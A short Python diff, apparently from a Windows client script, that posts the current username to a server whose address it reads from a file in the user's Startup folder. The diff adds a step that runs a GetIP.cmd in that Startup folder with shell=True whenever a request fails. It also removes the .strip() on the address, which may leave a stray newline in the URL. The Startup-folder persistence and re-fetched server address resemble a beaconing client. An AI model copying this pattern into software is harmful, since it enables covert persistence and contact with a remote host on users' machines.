@@ -9,8 +9,10 @@ data = {
     "user": username
 }
 
+RetryIP = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\GetIP.cmd"
+
 with open(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/CurrentIP.txt", "r") as file:
-    server = file.read().strip()
+    server = file.read()
 
 print(username)
 response = requests.post(f"{server}/users", json=data)
@@ -30,3 +32,6 @@ while True:
             })
     except Exception as e:
         print("Fehler:", e)
+        subprocess.run([RetryIP], shell=True)
+        with open(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/CurrentIP.txt", "r") as file:
+            server = file.read()
